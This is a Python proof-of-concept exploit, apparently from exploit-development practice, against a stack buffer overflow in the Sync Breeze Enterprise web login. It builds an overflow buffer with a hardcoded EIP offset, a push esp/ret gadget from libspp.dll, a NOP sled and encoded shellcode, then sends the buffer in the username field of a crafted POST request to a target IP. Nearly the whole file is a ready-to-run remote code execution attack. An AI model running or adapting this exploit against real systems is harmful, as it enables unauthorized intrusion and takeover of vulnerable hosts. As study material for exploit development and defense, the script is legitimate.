#!/usr/bin/env python3
import socket
import sys
from struct import pack

# POC buffer

BAD_CHARS = b"\x00\x0a\x0d\x25\x26\x2b\x3d"
OFFSET = 780 
#stack at 788


shellcode =  b""
shellcode += b"\xda\xc4\xbf\x24\xe0\x2f\xbb\xd9\x74\x24\xf4"
shellcode += b"\x5e\x31\xc9\xb1\x52\x83\xee\xfc\x31\x7e\x13"
shellcode += b"\x03\x5a\xf3\xcd\x4e\x5e\x1b\x93\xb1\x9e\xdc"
shellcode += b"\xf4\x38\x7b\xed\x34\x5e\x08\x5e\x85\x14\x5c"
shellcode += b"\x53\x6e\x78\x74\xe0\x02\x55\x7b\x41\xa8\x83"
shellcode += b"\xb2\x52\x81\xf0\xd5\xd0\xd8\x24\x35\xe8\x12"
shellcode += b"\x39\x34\x2d\x4e\xb0\x64\xe6\x04\x67\x98\x83"
shellcode += b"\x51\xb4\x13\xdf\x74\xbc\xc0\xa8\x77\xed\x57"
shellcode += b"\xa2\x21\x2d\x56\x67\x5a\x64\x40\x64\x67\x3e"
shellcode += b"\xfb\x5e\x13\xc1\x2d\xaf\xdc\x6e\x10\x1f\x2f"
shellcode += b"\x6e\x55\x98\xd0\x05\xaf\xda\x6d\x1e\x74\xa0"
shellcode += b"\xa9\xab\x6e\x02\x39\x0b\x4a\xb2\xee\xca\x19"
shellcode += b"\xb8\x5b\x98\x45\xdd\x5a\x4d\xfe\xd9\xd7\x70"
shellcode += b"\xd0\x6b\xa3\x56\xf4\x30\x77\xf6\xad\x9c\xd6"
shellcode += b"\x07\xad\x7e\x86\xad\xa6\x93\xd3\xdf\xe5\xfb"
shellcode += b"\x10\xd2\x15\xfc\x3e\x65\x66\xce\xe1\xdd\xe0"
shellcode += b"\x62\x69\xf8\xf7\x85\x40\xbc\x67\x78\x6b\xbd"
shellcode += b"\xae\xbf\x3f\xed\xd8\x16\x40\x66\x18\x96\x95"
shellcode += b"\x29\x48\x38\x46\x8a\x38\xf8\x36\x62\x52\xf7"
shellcode += b"\x69\x92\x5d\xdd\x01\x39\xa4\xb6\xed\x16\x8b"
shellcode += b"\xfa\x86\x64\xd3\x21\x7f\xe0\x35\x4f\x6f\xa4"
shellcode += b"\xee\xf8\x16\xed\x64\x98\xd7\x3b\x01\x9a\x5c"
shellcode += b"\xc8\xf6\x55\x95\xa5\xe4\x02\x55\xf0\x56\x84"
shellcode += b"\x6a\x2e\xfe\x4a\xf8\xb5\xfe\x05\xe1\x61\xa9"
shellcode += b"\x42\xd7\x7b\x3f\x7f\x4e\xd2\x5d\x82\x16\x1d"
shellcode += b"\xe5\x59\xeb\xa0\xe4\x2c\x57\x87\xf6\xe8\x58"
shellcode += b"\x83\xa2\xa4\x0e\x5d\x1c\x03\xf9\x2f\xf6\xdd"
shellcode += b"\x56\xe6\x9e\x98\x94\x39\xd8\xa4\xf0\xcf\x04"
shellcode += b"\x14\xad\x89\x3b\x99\x39\x1e\x44\xc7\xd9\xe1"
shellcode += b"\x9f\x43\xe9\xab\xbd\xe2\x62\x72\x54\xb7\xee"
shellcode += b"\x85\x83\xf4\x16\x06\x21\x85\xec\x16\x40\x80"
shellcode += b"\xa9\x90\xb9\xf8\xa2\x74\xbd\xaf\xc3\x5c"

#POC buffer
buf = b"A" * OFFSET # junk to EIP
buf += pack("<I", 0x10138C27) #push esp #ret "Log data, item 5  Address=10138C27 Message=  0x10138c27 : push esp # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)

buf += b"CCCC"  #junk to gt to ESP 784

buf += b"\x90" * 16 # NOPs to create buffer on ESP

buf += shellcode




#how many A's before we controll EIP
#replace EIP with valid address
#put shellcode in ESP in Alo


body = b"username=" + buf + b"&password=A"

req = b"POST /login HTTP/1.1\r\n"
req += b"Host: 192.168.211.149\r\n"
req += b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
req += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += b"Accept-Language: en-US,en;q=0.5\r\n"
req += b"Referer: http://192.168.211.149/login\r\n"
req += b"Connection: close\r\n"
req += b"Content-Type: application/x-www-form-urlencoded\r\n"
req += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
req += b"\r\n"
req += body

if len(sys.argv) < 2:
    print("Usage: ./poc.py <target-IP>")
    exit()

print('[+] Sending payload...')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 80))
s.send(req)
s.close()
print('[+] Payload sent.')